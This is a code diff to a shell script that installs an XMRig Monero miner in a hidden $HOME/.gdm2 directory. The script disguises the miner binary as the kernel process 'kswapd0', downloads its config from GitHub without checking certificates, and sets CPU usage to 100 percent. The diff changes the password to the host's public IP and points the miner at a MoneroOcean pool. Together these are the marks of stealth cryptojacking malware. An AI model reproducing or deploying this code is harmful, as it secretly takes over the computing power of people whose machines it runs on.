@@ -240,7 +240,8 @@ mv $HOME/.gdm2/xmrig $HOME/.gdm2/kswapd0
 
 #PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 #PASS=`hostname`
-PASS=`sh -c "IP=\$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); nslookup \$IP | grep 'name =' | awk '{print \$NF}'"`
+#PASS=`sh -c "IP=\$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); nslookup \$IP | grep 'name =' | awk '{print \$NF}'"`
+PASS=`sh -c "(curl -4 ip.sb)"`
 #if [ "$PASS" == "localhost" ]; then
 #  PASS=`ip route get 1 | awk '{print $NF;exit}'`
 #fi
@@ -341,7 +342,7 @@ rm -rf $HOME/.gdm2/config.json
 wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json -O $HOME/.gdm2/config.json
 curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $HOME/.gdm2/config.json
 
-sed -i 's/"url": *"[^"]*",/"url": "194.164.63.118:8080",/' $HOME/.gdm2/config.json
+sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.gdm2/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.gdm2/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2/config.json
